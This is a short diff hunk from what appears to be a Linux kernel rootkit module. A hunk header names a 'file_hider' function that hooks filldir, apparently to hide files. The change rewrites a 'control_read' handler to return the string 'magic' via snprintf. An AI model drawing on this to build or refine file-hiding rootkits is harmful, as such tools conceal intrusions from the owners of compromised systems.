@@ -51,14 +51,10 @@ static int file_hider(struct file* fp, void* d, filldir_t filldir){
 
 static int control_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
 	
-	int size = strlen(internal_buffer);
-	sprintf(internal_buffer,"magic");
-	if(count >= size - off){
-		memcpy(buffer, internal_buffer+off, size-off );
-	}else{
-		memcpy(buffer, internal_buffer+off, count);
-	}
-	return size-off;
+	int len=0;
+	len=snprintf(buffer,count,"magic");
+
+	return len;
 }
 
 static int control_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
